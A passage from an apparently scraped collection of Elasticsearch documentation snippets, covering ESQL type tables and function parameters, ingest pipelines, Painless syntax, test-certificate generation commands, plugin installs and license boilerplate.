  Collector of(Supplier,BiConsumer,BinaryOperator,Function,Collector.Characteristics[])
  Collector of(Supplier,BiConsumer,BinaryOperator,Collector.Characteristics[])
  Supplier supplier()
}

----------------------------------------

TITLE: Documenting Supported Types for ESQL String Function in Markdown
DESCRIPTION: This markdown table describes the supported input and output types for an ESQL function. It shows various combinations of string and substring types (keyword and text), with an optional integer start parameter, always resulting in an integer output.

LANGUAGE: markdown
CODE:
| string | substring | start | result |
| --- | --- | --- | --- |
| keyword | keyword | integer | integer |
| keyword | keyword | | integer |
| keyword | text | integer | integer |
| keyword | text | | integer |
| text | keyword | integer | integer |
| text | keyword | | integer |
| text | text | integer | integer |
| text | text | | integer |

----------------------------------------

TITLE: Displaying Supported Numeric Types and Results in Markdown
DESCRIPTION: This markdown snippet shows a table of supported numeric types (double, integer, long, unsigned_long) and their corresponding result type (double) for an ESQL function.

LANGUAGE: markdown
CODE:
| number | result |
| --- | --- |
| double | double |
| integer | double |
| long | double |
| unsigned_long | double |

----------------------------------------

TITLE: CIDR_MATCH Function Header Comment
DESCRIPTION: Comment indicating this is auto-generated documentation by ESQL's AbstractFunctionTestCase

LANGUAGE: markdown
CODE:
% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.

----------------------------------------

TITLE: Calculating Average using ESQL AVG Function
DESCRIPTION: Demonstrates how to calculate the average value of a numeric field (height) from the employees table using the ESQL AVG function with the STATS clause.

LANGUAGE: sql
CODE:
FROM employees
| STATS AVG(height)

----------------------------------------

TITLE: Creating Elasticsearch Index with Custom Analyzer (Version 5)
DESCRIPTION: Creates an Elasticsearch index with a custom analyzer configuration for version 5, including tokenizer and filter settings.

LANGUAGE: json
CODE:
PUT /index
{
  "settings": {
    "analysis": {
      "analyzer": {
        "custom_analyzer": {
          "type": "custom",
          "tokenizer": "standard",
          "filter": [
            "standard",
            "lowercase"
          ]
        }
      }
    }
  },
  "mappings": {
    "my_type": {
      "properties": {
        "content": {
          "type": "text",
          "analyzer": "custom_analyzer"
        }
      }
    }
  }
}

----------------------------------------

TITLE: ESQL Numeric Type Mappings Table
DESCRIPTION: Markdown table showing the mapping between input numeric types and their corresponding result types in ESQL functions. Covers double, integer, long, and unsigned_long data types.

LANGUAGE: markdown
CODE:
| number | result |
| --- | --- |
| double | double |
| integer | integer |
| long | long |
| unsigned_long | unsigned_long |

----------------------------------------

TITLE: Displaying Type Support Matrix in Markdown Table
DESCRIPTION: A markdown table showing the mapping between input field types and their corresponding result types in ESQL functions. Shows that both 'keyword' and 'text' field types map to 'keyword' result type.

LANGUAGE: markdown
CODE:
| field | result |
| --- | --- |
| keyword | keyword |
| text | keyword |

----------------------------------------

TITLE: Output Document After JSON Processor in Elasticsearch
DESCRIPTION: This snippet illustrates the result of applying the JSON processor to the input document, showing the parsed JSON object in the target field.

LANGUAGE: json
CODE:
{
  "string_source": "{\"foo\": 2000}",
  "json_target": {
    "foo": 2000
  }
}

----------------------------------------

TITLE: Documenting ESQL String Function Parameters
DESCRIPTION: Documents three parameters for a string manipulation function: the input string, substring to search for, and start index position.

LANGUAGE: markdown
CODE:
% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.

**Parameters**

`string`
:   An input string

`substring`
:   A substring to locate in the input string

`start`
:   The start index

----------------------------------------

TITLE: Processing Array of Objects with Foreach
DESCRIPTION: Demonstrates using foreach processor to modify objects within an array, specifically removing an 'id' field from each object.

LANGUAGE: javascript
CODE:
{
  "persons" : [
    {
      "id" : "1",
      "name" : "John Doe"
    },
    {
      "id" : "2",
      "name" : "Jane Doe"
    }
  ]
}

LANGUAGE: javascript
CODE:
{
  "foreach" : {
    "field" : "persons",
    "processor" : {
      "remove" : {
        "field" : "_ingest._value.id"
      }
    }
  }
}

----------------------------------------

TITLE: Creating Elasticsearch Snapshot
DESCRIPTION: Creates a snapshot of the specified Elasticsearch index, ignoring unavailable indices and excluding global state.

LANGUAGE: json
CODE:
PUT /_snapshot/repository/snapshot
{
    "indices": "index",
    "ignore_unavailable": "true",
    "include_global_state": false
}

----------------------------------------

TITLE: Defining Supported Types Table in Markdown
DESCRIPTION: This snippet creates a markdown table that defines the supported input types for a function and their corresponding result types. It covers double, integer, long, and unsigned_long input types, all resulting in a double output.

LANGUAGE: markdown
CODE:
| number | result |
| --- | --- |
| double | double |
| integer | double |
| long | double |
| unsigned_long | double |

----------------------------------------

TITLE: Displaying Supported Geometry Types in Markdown Table
DESCRIPTION: This markdown table shows the mapping between input geometry types and their corresponding result types for ESQL functions. It includes both Cartesian and geographic coordinate systems.

LANGUAGE: markdown
CODE:
| geometry | result |
| --- | --- |
| cartesian_point | cartesian_shape |
| cartesian_shape | cartesian_shape |
| geo_point | geo_shape |
| geo_shape | geo_shape |

----------------------------------------

TITLE: Documenting 'field' Parameter in Markdown
DESCRIPTION: This snippet defines the 'field' parameter as a multivalue expression using Markdown syntax. It's part of the documentation for an ESQL-related test case.

LANGUAGE: markdown
CODE:
`field`
:   Multivalue expression.

----------------------------------------

TITLE: Decoding Base64 String using FROM_BASE64 in Elasticsearch ESQL
DESCRIPTION: Demonstrates how to decode a base64 encoded string using the from_base64() function in Elasticsearch ESQL. The example decodes the string 'ZWxhc3RpYw==' which contains the encoded value 'elastic'.

LANGUAGE: sql
CODE:
row a = "ZWxhc3RpYw=="
| eval d = from_base64(a)

----------------------------------------

TITLE: Configuring Elasticsearch Keystore for SSL
DESCRIPTION: Command to add the keystore password as a secure configuration setting in Elasticsearch. This step is necessary when configuring Elasticsearch to enable SSL.

LANGUAGE: shell
CODE:
elasticsearch-keystore add "xpack.security.http.ssl.keystore.secure_password"

----------------------------------------

TITLE: Displaying Supported Types Table in Markdown
DESCRIPTION: A markdown table showing the supported data type combinations for an ESQL function. It lists the left-hand side (lhs) type, right-hand side (rhs) type, and the resulting type for various data types including dates, numbers, strings, and special types.

LANGUAGE: markdown
CODE:
| lhs | rhs | result |
| --- | --- | --- |
| date | date | boolean |
| date | date_nanos | boolean |
| date_nanos | date | boolean |
| date_nanos | date_nanos | boolean |
| double | double | boolean |
| double | integer | boolean |
| double | long | boolean |
| integer | double | boolean |
| integer | integer | boolean |
| integer | long | boolean |
| ip | ip | boolean |
| keyword | keyword | boolean |
| keyword | text | boolean |
| long | double | boolean |
| long | integer | boolean |
| long | long | boolean |
| text | keyword | boolean |
| text | text | boolean |
| unsigned_long | unsigned_long | boolean |
| version | version | boolean |

----------------------------------------

TITLE: ESQL Type Compatibility Matrix
DESCRIPTION: Markdown table showing the mapping between different point/shape data types and their result types in ESQL. Covers cartesian_point, cartesian_shape, geo_point, and geo_shape types, all returning double values.

LANGUAGE: markdown
CODE:
| point | result |
| --- | --- |
| cartesian_point | double |
| cartesian_shape | double |
| geo_point | double |
| geo_shape | double |

----------------------------------------

TITLE: Resulting Indexed Document in Elasticsearch
DESCRIPTION: Final document showing fields set by both inner and outer pipelines.

LANGUAGE: js
CODE:
{
  "field": "value",
  "inner_pipeline_set": "inner",
  "outer_pipeline_set": "outer"
}

----------------------------------------

TITLE: Parameter Definition in Markdown
DESCRIPTION: Defines the field parameter that can accept single or multi-valued columns or expressions as input.

LANGUAGE: markdown
CODE:
`field`
:   Input value. The input can be a single- or multi-valued column or an expression.

----------------------------------------

TITLE: Configuring Windows Path Settings in Elasticsearch
DESCRIPTION: Configuration example for setting data and log paths on Windows systems using elasticsearch.yml with escaped backslashes

LANGUAGE: yaml
CODE:
path:
  data: "C:\\Elastic\\Elasticsearch\\data"
  logs: "C:\\Elastic\\Elasticsearch\\logs"

----------------------------------------

TITLE: Build_Shape Function Type Mapping Table
DESCRIPTION: A mapping table showing supported input field types and their corresponding result types for the build_shape function in Elasticsearch SQL.

LANGUAGE: markdown
CODE:
| field | result |
| --- | --- |
| cartesian_point | cartesian_shape |
| cartesian_shape | cartesian_shape |
| keyword | cartesian_shape |
| text | cartesian_shape |

----------------------------------------

TITLE: Generating SSL Keys for Server and Client
DESCRIPTION: Creates RSA key pairs for both server and client with SAN extensions for localhost. Uses keytool to generate keystores with 99999 days validity.

LANGUAGE: bash
CODE:
keytool -v -genkey -keyalg rsa -alias server -keypass password -keystore server.keystore -storepass password -validity 99999 -ext SAN=dns:localhost,ip:127.0.0.1
keytool -v -genkey -keyalg rsa -alias client -keypass password -keystore client.keystore -storepass password -validity 99999 -ext SAN=dns:localhost,ip:127.0.0.1

----------------------------------------

TITLE: Defining Supported Types for ESQL Function in Markdown
DESCRIPTION: A markdown table defining the supported input types (str and pattern) and result type for an ESQL function. It specifies that the function accepts keyword or text as 'str', keyword as 'pattern', and returns a boolean result.

LANGUAGE: markdown
CODE:
| str | pattern | result |
| --- | --- | --- |
| keyword | keyword | boolean |
| text | keyword | boolean |

----------------------------------------

TITLE: Build_Shape Function Type Mapping Table
DESCRIPTION: A mapping table showing supported input field types and their corresponding result types for the build_shape function in Elasticsearch SQL.

LANGUAGE: markdown
CODE:
| field | result |
| --- | --- |
| cartesian_point | cartesian_shape |
| cartesian_shape | cartesian_shape |
| keyword | cartesian_shape |
| text | cartesian_shape |

----------------------------------------

TITLE: Distance Function Parameter Documentation
DESCRIPTION: Defines two parameters (geomA and geomB) used in distance calculations. Both parameters must be of compatible geometric types (either geographic or Cartesian) and support point and shape data types. Returns null if either parameter is null.

LANGUAGE: markdown
CODE:
`geomA`
:   Expression of type `geo_point`, `cartesian_point`, `geo_shape` or `cartesian_shape`. If `null`, the function returns `null`.

`geomB`
:   Expression of type `geo_point`, `cartesian_point`, `geo_shape` or `cartesian_shape`. If `null`, the function returns `null`. The second parameter must also have the same coordinate system as the first. This means it is not possible to combine `geo_*` and `cartesian_*` parameters.

----------------------------------------

TITLE: Using COALESCE Function in ESQL
DESCRIPTION: Demonstrates how to use the COALESCE function to return the first non-null value from multiple arguments. In this example, it evaluates two fields 'a' (null) and 'b' ("b"), returning "b" as it's the first non-null value.

LANGUAGE: sql
CODE:
ROW a=null, b="b"
| EVAL COALESCE(a, b)

----------------------------------------

TITLE: Generating Self-Signed Certificates
DESCRIPTION: Creates self-signed certificates using elasticsearch-certutil and distributes them to the appropriate test directories. Certificates are valid for 7300 days.

LANGUAGE: bash
CODE:
rm -rf /tmp/certs; mkdir /tmp/certs; rm -rf local-self
bin/elasticsearch-certutil cert --pem --silent --in instances.yml --out /tmp/certs/self.zip --days 7300 --self-signed
unzip /tmp/certs/self.zip -d ./local-self
cp -r ./local-self/n*/*.crt $SOURCE_ROOT/x-pack/plugin/core/src/test/resources/org/elasticsearch/xpack/security/transport/ssl/certs/simple/nodes/self-signed
cp -r ./local-self/n*/*.key $SOURCE_ROOT/x-pack/plugin/core/src/test/resources/org/elasticsearch/xpack/security/transport/ssl/certs/simple/nodes/self-signed

----------------------------------------

TITLE: Querying regsvr32 Events
DESCRIPTION: EQL query to count events associated with regsvr32.exe processes.

LANGUAGE: console
CODE:
GET /my-data-stream/_eql/search?filter_path=-hits.events
{
  "query": """
    any where process.name == "regsvr32.exe"
  """,
  "size": 200
}

----------------------------------------

TITLE: Documenting Supported Types for ESQL Function in Markdown
DESCRIPTION: This markdown table shows the supported input field types and their corresponding result types for an ESQL function. All input types map to an integer result.

LANGUAGE: markdown
CODE:
| field | result |
| --- | --- |
| boolean | integer |
| cartesian_point | integer |
| cartesian_shape | integer |
| date | integer |
| date_nanos | integer |
| double | integer |
| geo_point | integer |
| geo_shape | integer |
| integer | integer |
| ip | integer |
| keyword | integer |
| long | integer |
| text | integer |
| unsigned_long | integer |
| version | integer |

----------------------------------------

TITLE: Pipeline Execution Response in Elasticsearch
DESCRIPTION: Response showing successful document indexing with nested pipeline execution.

LANGUAGE: console-result
CODE:
{
  "_index": "my-index-000001",
  "_id": "1",
  "_version": 1,
  "result": "created",
  "_shards": {
    "total": 2,
    "successful": 1,
    "failed": 0
  },
  "_seq_no": 66,
  "_primary_term": 1
}

----------------------------------------

TITLE: Documenting ESQL Function Parameters in Markdown
DESCRIPTION: This snippet defines the parameters for an ESQL function using Markdown syntax. It includes three parameters: string1 and string2 (both multivalue expressions), and delim (an optional delimiter with a default value).

LANGUAGE: markdown
CODE:
**Parameters**

`string1`
:   Multivalue expression.

`string2`
:   Multivalue expression.

`delim`
:   Delimiter. Optional; if omitted, `,` is used as a default delimiter.

----------------------------------------

TITLE: Executing Span Or Query in Elasticsearch
DESCRIPTION: This snippet demonstrates how to use the Span Or query in Elasticsearch. It combines multiple span_term queries using the span_or clause to match documents where any of the specified terms appear in the field.

LANGUAGE: console
CODE:
GET /_search
{
  "query": {
    "span_or" : {
      "clauses" : [
        { "span_term" : { "field" : "value1" } },
        { "span_term" : { "field" : "value2" } },
        { "span_term" : { "field" : "value3" } }
      ]
    }
  }
}

----------------------------------------

TITLE: Registering an Asynchronous Long Gauge in Java for Elasticsearch Metrics
DESCRIPTION: Shows how to register an asynchronous LongGauge instrument with MeterRegistry. A callback is provided to report the absolute measured value with attributes.

LANGUAGE: java
CODE:
MeterRegistry registry;
long someValue = 1;
registry.registerLongGauge("es.test.cpu.temperature", "the current CPU temperature as measured by psensor", "degrees Celsius",
() -> new LongWithAttributes(someValue, Map.of("cpuNumber", 1)));

----------------------------------------

TITLE: Adding Documents to Elasticsearch with Custom Analyzer (Version 5)
DESCRIPTION: Adds a document to the Elasticsearch index using a custom analyzer for version 5.

LANGUAGE: json
CODE:
POST /index/my_type
{
  "content": "Doc 1"
}

----------------------------------------

TITLE: ESQL Type Mappings Table
DESCRIPTION: A markdown table showing the mapping between field types and their corresponding result types in ESQL functions. Includes primitive types, geometric types, date types, and specialized Elasticsearch types.

LANGUAGE: markdown
CODE:
| field | result |
| --- | --- |
| boolean | boolean |
| cartesian_point | cartesian_point |
| cartesian_shape | cartesian_shape |
| date | date |
| date_nanos | date_nanos |
| double | double |
| geo_point | geo_point |
| geo_shape | geo_shape |
| integer | integer |
| ip | ip |
| keyword | keyword |
| long | long |
| text | keyword |
| unsigned_long | unsigned_long |
| version | version |

----------------------------------------

TITLE: Documenting String Parameter in ESQL Test
DESCRIPTION: Documentation block specifying a string parameter for an ESQL function test case. Generated automatically by AbstractFunctionTestCase.

LANGUAGE: markdown
CODE:
`string`
:   A string.

----------------------------------------

TITLE: Histogram Aggregation on Range Field
DESCRIPTION: This snippet shows a histogram aggregation on the expected_attendees range field, demonstrating how a single document can appear in multiple buckets.

LANGUAGE: console
CODE:
POST /range_index/_search?size=0
{
  "aggs": {
    "range_histo": {
      "histogram": {
        "field": "expected_attendees",
        "interval": 5
      }
    }
  }
}

----------------------------------------

TITLE: Resetting Custom Scheduling for Elasticsearch Connector
DESCRIPTION: This snippet updates a connector document to reset the custom scheduling configuration. It's used as a workaround for custom scheduling issues when upgrading from version 8.6 or earlier.

LANGUAGE: console
CODE:
POST /.elastic-connectors/_update/connector-id
{
  "doc": {
    "custom_scheduling": {}
  }
}

----------------------------------------

TITLE: Creating ZIP Archive of Elasticsearch Snapshots
DESCRIPTION: Creates a ZIP archive of the Elasticsearch snapshots directory.

LANGUAGE: bash
CODE:
zip -r snapshot.zip /tmp/sharedESData/snapshots/*

----------------------------------------

TITLE: Indexing and Retrieving a Rectangular Geotile in Elasticsearch
DESCRIPTION: This example shows how to index a document with a geotile value and retrieve it, demonstrating the conversion to a GeoJSON envelope.

LANGUAGE: console
CODE:
PUT geocells/_doc/1?pipeline=geotile2shape
{
  "geocell": "4/8/5"
}

GET geocells/_doc/1

----------------------------------------

TITLE: Executing Sparse Vector Query with Precomputed Vectors in Elasticsearch
DESCRIPTION: This example shows how to use a sparse vector query with precomputed vectors. It requires specifying the field and a query_vector containing token-weight pairs.

LANGUAGE: json
CODE:
{
   "query":{
      "sparse_vector": {
        "field": "ml.tokens",
        "query_vector": { "token1": 0.5, "token2": 0.3, "token3": 0.2 }
      }
   }
}

----------------------------------------

TITLE: Using ROUND Function in ESQL Query
DESCRIPTION: Demonstrates how to use the ROUND function to convert height measurements from meters to feet with one decimal place precision. The function rounds a number to the specified number of decimal places, defaulting to 0 for integers, and supports negative precision for rounding left of the decimal point.

LANGUAGE: sql
CODE:
FROM employees
| KEEP first_name, last_name, height
| EVAL height_ft = ROUND(height * 3.281, 1)

----------------------------------------

TITLE: Listing Missing Elasticsearch Tests in Markdown
DESCRIPTION: A markdown list of Elasticsearch features that require test implementation. The list includes consistency, retry_on_conflict, and timeout features.

LANGUAGE: markdown
CODE:
# consistency
# retry_on_conflict
# timeout

----------------------------------------

TITLE: PEM Certificate Generation
DESCRIPTION: Creates a new certificate in PEM format with separate key and certificate files

LANGUAGE: bash
CODE:
function new-pem-cert() {
    local CrtFile="$1"
    local KeyFile="$2"
    local KeyPass="$3"
    local CertName="$4"
    local CaFile="$5"
    local CaPass="$6"
    shift 6

    local ZipFile=${PWD}/$CertName.zip
    local PassOpt=""
    if [ -n "$KeyPass" ]
    then
        PassOpt="--pass=$KeyPass"
    fi

    certutil cert --pem \
        --ca="${PWD}/$CaFile" --ca-pass="$CaPass" \
        --name="$CertName" --out $ZipFile \
        --days=5000 $PassOpt \
        "$@"
    unzip -p $ZipFile "$CertName/$CertName.crt" > $CrtFile
    unzip -p $ZipFile "$CertName/$CertName.key" > $KeyFile
    rm $ZipFile
}

----------------------------------------

TITLE: Installing HDFS Repository Plugin in Elasticsearch
DESCRIPTION: Command to install the HDFS repository plugin using the Elasticsearch plugin manager. This plugin enables HDFS as a repository for snapshot and restore operations.

LANGUAGE: sh
CODE:
sudo bin/elasticsearch-plugin install repository-hdfs

----------------------------------------

TITLE: Elasticsearch Certutil Command Synopsis
DESCRIPTION: The synopsis shows the general structure and available options for the elasticsearch-certutil command, including its various modes and parameters.

LANGUAGE: shell
CODE:
bin/elasticsearch-certutil
(
(ca [--ca-dn <name>] [--days <n>] [--pem])

| (cert ([--ca <file_path>] | [--ca-cert <file_path> --ca-key <file_path>])
[--ca-dn <name>] [--ca-pass <password>] [--days <n>]
[--dns <domain_name>] [--in <input_file>] [--ip <ip_addresses>]
[--multiple] [--name <file_name>] [--pem] [--self-signed])

| (csr [--dns <domain_name>] [--in <input_file>] [--ip <ip_addresses>]
[--name <file_name>])

[-E <KeyValuePair>] [--keysize <bits>] [--out <file_path>]
[--pass <password>]
)

| http

[-h, --help] ([-s, --silent] | [-v, --verbose])

----------------------------------------

TITLE: Elvis Operator in Painless
DESCRIPTION: Shows usage of the elvis operator '?:' as a shortcut for conditional operations in Painless, handling null checks efficiently.

LANGUAGE: painless
CODE:
List x = new ArrayList();
List y = x ?: new ArrayList();
y = null;
List z = y ?: new ArrayList();

----------------------------------------

TITLE: Defining CharBuffer Class in Java NIO
DESCRIPTION: Defines the CharBuffer class with a method to get a character at a specific index. Some methods are commented out as TODOs.

LANGUAGE: Java
CODE:
class java.nio.CharBuffer {
  char get(int)
  # TODO: https:#github.com/elastic/elasticsearch/issues/79867
  # CharBuffer get(int, char[])
  # CharBuffer get(int, char[], int, int)
}

----------------------------------------

TITLE: Counting Records in Elasticsearch SQL
DESCRIPTION: Returns the total number of input values using the COUNT function.

LANGUAGE: sql
CODE:
SELECT COUNT(*) AS count FROM emp;

----------------------------------------

TITLE: Indexing and Retrieving a Hexagonal Geohex in Elasticsearch
DESCRIPTION: This example demonstrates indexing a document with an H3 geohex value and retrieving it, showing the conversion to a WKT polygon.

LANGUAGE: console
CODE:
PUT geocells/_doc/1?pipeline=geohex2shape
{
  "geocell": "811fbffffffffff"
}

GET geocells/_doc/1

----------------------------------------

TITLE: Setting SMB Storage Type for Individual Index
DESCRIPTION: REST API call to create a new index with SMB-optimized storage type. This configuration applies the storage setting to a specific index during creation.

LANGUAGE: json
CODE:
PUT my-index-000001
{
   "settings": {
       "index.store.type": "smb_mmap_fs"
   }
}

----------------------------------------

TITLE: Implementing TF-IDF Using Scripted Similarity
DESCRIPTION: Example demonstrating how to implement a custom TF-IDF similarity using scripted similarity with test documents and search query.

LANGUAGE: console
CODE:
PUT /index
{
  "settings": {
    "number_of_shards": 1,
    "similarity": {
      "scripted_tfidf": {
        "type": "scripted",
        "script": {
          "source": "double tf = Math.sqrt(doc.freq); double idf = Math.log((field.docCount+1.0)/(term.docFreq+1.0)) + 1.0; double norm = 1/Math.sqrt(doc.length); return query.boost * tf * idf * norm;"
        }
      }
    }
  },
  "mappings": {
    "properties": {
      "field": {
        "type": "text",
        "similarity": "scripted_tfidf"
      }
    }
  }
}

----------------------------------------

TITLE: Declaring and Using a Function in Painless
DESCRIPTION: Demonstrates how to declare a simple boolean function 'isNegative' that checks if a value is less than zero, and then shows how to use this function in an if statement.

LANGUAGE: painless
CODE:
boolean isNegative(def x) { x < 0 }
...
if (isNegative(someVar)) {
  ...
}

----------------------------------------

TITLE: Applying Apache License Boilerplate Notice
DESCRIPTION: Standard boilerplate notice text for applying the Apache License 2.0 to a new work. Includes copyright notice and license acknowledgment text that should be included in source files.

LANGUAGE: text
CODE:
   Copyright [yyyy] [name of copyright owner]

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

----------------------------------------

TITLE: Using TIME_PARSE Function
DESCRIPTION: Examples of using TIME_PARSE function to parse time strings into TIME values using Java DateTimeFormatter patterns.

LANGUAGE: sql
CODE:
SELECT TIME_PARSE('10:20:30.123', 'HH:mm:ss.SSS') AS "time";

LANGUAGE: sql
CODE:
SELECT TIME_PARSE('10:20:30-01:00', 'HH:mm:ssXXX') AS "time";

----------------------------------------

TITLE: Installing ICU Analysis Plugin in Elasticsearch
DESCRIPTION: This command installs the ICU Analysis plugin using the Elasticsearch plugin manager. The plugin must be installed on every node in the cluster, and each node must be restarted after installation.

LANGUAGE: sh
CODE:
sudo bin/elasticsearch-plugin install analysis-icu

----------------------------------------

TITLE: Including MV_LAST Function Documentation in Markdown
DESCRIPTION: This snippet demonstrates how to include various sections of the MV_LAST function documentation using Markdown include directives. It references separate files for parameters, description, types, and examples.

LANGUAGE: markdown
CODE:
:::{include} ../parameters/mv_last.md
:::

:::{include} ../description/mv_last.md
:::

:::{include} ../types/mv_last.md
:::

:::{include} ../examples/mv_last.md
:::

----------------------------------------

TITLE: Multi-line Comments Example in Painless
DESCRIPTION: Shows various ways to use multi-line comments in Painless scripts using /* */ tokens, demonstrating different placements and formats of multi-line comments in relation to code.

LANGUAGE: painless
CODE:
/* multi-
   line
   comment */

int value; /* multi-
                  line
                  comment */ value = 0;

int value; /* multi-line
                  comment */

/* multi-line
   comment */ int value;

int value; /* multi-line
                  comment */ value = 0;

int value; /* multi-line comment */ value = 0;

----------------------------------------

TITLE: Apache License 2.0 Boilerplate Notice
DESCRIPTION: Standard boilerplate notice text to apply the Apache License 2.0 to a work. The notice includes placeholders for copyright year and owner information.

LANGUAGE: text
CODE:
   Copyright {yyyy} {name of copyright owner}

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

----------------------------------------

TITLE: Calendar Era Enumerations
DESCRIPTION: Enumeration classes defining eras for different calendar systems. Includes constants and utility methods for era management.

LANGUAGE: java
CODE:
class java.time.chrono.IsoEra {
  IsoEra BCE
  IsoEra CE
  int getValue()
  IsoEra of(int)
  IsoEra valueOf(String)
  IsoEra[] values()
}

----------------------------------------

TITLE: Accessing Array Fields Using Dot Notation
DESCRIPTION: Demonstrates how to access and copy specific array elements using dot notation in the Set processor

LANGUAGE: console
CODE:
POST /_ingest/pipeline/_simulate
{
  "pipeline": {
    "processors": [
      {
        "set": {
          "field": "my_field",
          "value": "{{{input_field.1}}}"
        }
      }
    ]
  },
  "docs": [
    {
      "_index": "index",
      "_id": "id",
      "_source": {
        "input_field": [
          "Ubuntu",
          "Windows",
          "Ventura"
        ]
      }
    }
  ]
}

----------------------------------------

TITLE: Defining String Augmentations for Elasticsearch Update By Query Scripts
DESCRIPTION: Specifies allowed String augmentation methods for hashing operations in update_by_query scripts.

LANGUAGE: Java
CODE:
class java.lang.String {
  String org.elasticsearch.painless.api.Augmentation sha1()
  String org.elasticsearch.painless.api.Augmentation sha256()
  String org.elasticsearch.painless.api.Augmentation sha512()
}

----------------------------------------

TITLE: Updating Elasticsearch Mapping for Sync Jobs
DESCRIPTION: This snippet adds a missing 'job_type' field mapping to the .elastic-connectors-sync-jobs-v1 index. This is necessary to resolve sync job failures after upgrading from versions earlier than 8.9.0.

LANGUAGE: console
CODE:
PUT .elastic-connectors-sync-jobs-v1/_mapping
{
  "properties": {
    "job_type": {
      "type": "keyword"
    }
  }
}

----------------------------------------

TITLE: Capitalizing Vowels in Last Names Using Painless Regex
DESCRIPTION: This snippet shows how to use Painless with regular expressions to capitalize all vowels in players' last names in Elasticsearch documents.

LANGUAGE: console
CODE:
POST hockey/_update_by_query
{
  "script": {
    "lang": "painless",
    "source": """
      ctx._source.last = ctx._source.last.replaceAll(/[aeiou]/, m ->
        m.group().toUpperCase(Locale.ROOT))
    """
  }
}

----------------------------------------

TITLE: ASM License Page HTML Structure
DESCRIPTION: Complete HTML template for the ASM project's license page, featuring a responsive navigation header, collapsible menu, and formatted license text. Includes meta tags for proper character encoding and viewport settings.

LANGUAGE: html
CODE:
<!DOCTYPE html>
<html>
<head>
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>ASM - License</title>
  <link rel="stylesheet" type="text/css" href="style.css">
</head>
<body>
  <input id="nav-trigger" type="checkbox" hidden>
<div class="header">
  <label for="nav-trigger" class="nav-trigger">
    <img src="burger-icon.svg" class="burger-icon">
  </label>
  <a href="index.html">
    <img src="asm-logo.svg" class="asm-icon">
  </a>
  <span class="asm-title">ASM</span>
  <a href="https://gitlab.ow2.org/asm/asm">
    <img src="gitlab-logo.svg" class="gitlab-icon">
  </a>
</div>
<label for="nav-trigger" class="nav-overlay"></label>
<nav>
  <ul>
    <li><a href="index.html">Home</a></li>
    <li>
      <a href="documentation.html">Documentation</a>
      <ul>
        <li><a href="asm4-guide.pdf">User guide</a></li>
        <li><a href="javadoc/overview-summary.html">Javadoc</a></li>
        <li><a href="faq.html">FAQ</a></li>
        <li><a href="developer-guide.html">Developer guide</a></li>
      </ul>
    </li>
    <li>
      <a href="about.html">About</a>
      <ul>
        <li><a href="license.html">License</a></li>
        <li><a href="publications.html">Publications</a></li>
        <li><a href="versions.html">Versions</a></li>
      </ul>
    </li>
  </ul>
</nav>

  <div class="page-content">
    <h1>License</h1>
    <p>ASM is released under the following 3-Clause BSD License:</p>
    <pre>ASM: a very small and fast Java bytecode manipulation framework
Copyright (c) 2000-2011 INRIA, France Telecom
All rights reserved.

Redistribution and use in source and binary forms, with or without
modification, are permitted provided that the following conditions
are met:
1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.
2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.
3. Neither the name of the copyright holders nor the names of its
  contributors may be used to endorse or promote products derived from
  this software without specific prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE
LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF
THE POSSIBILITY OF SUCH DAMAGE.</pre>
  </div>
</body>
</html>

----------------------------------------

TITLE: Updating Elasticsearch Hosts Configuration in YAML
DESCRIPTION: Example of modifying the elasticsearch.hosts setting in kibana.yml to use HTTPS instead of HTTP for secure connections.

LANGUAGE: yaml
CODE:
elasticsearch.hosts: [ "https://localhost:9200" ]

----------------------------------------

TITLE: Defining WriteField Operations for Reindex Scripts in Java
DESCRIPTION: Specifies allowed operations on write fields, including manipulation, transformation, and nested document handling in reindex scripts.

LANGUAGE: java
CODE:
class org.elasticsearch.script.field.WriteField {
    String getName()
    boolean exists()
    WriteField move(def)
    WriteField overwrite(def)
    void remove()
    WriteField set(def)
    WriteField append(def)
    boolean isEmpty()
    int size()
    Iterator iterator()
    def get(def)
    def get(int, def)
    boolean hasValue(Predicate)
    WriteField transform(Function)
    WriteField deduplicate()
    WriteField removeValuesIf(Predicate)
    WriteField removeValue(int)
    NestedDocument doc()
    NestedDocument doc(int)
    Iterable docs()
}

----------------------------------------

TITLE: Converting String to GeoPoint and Extracting Coordinates in ESQL
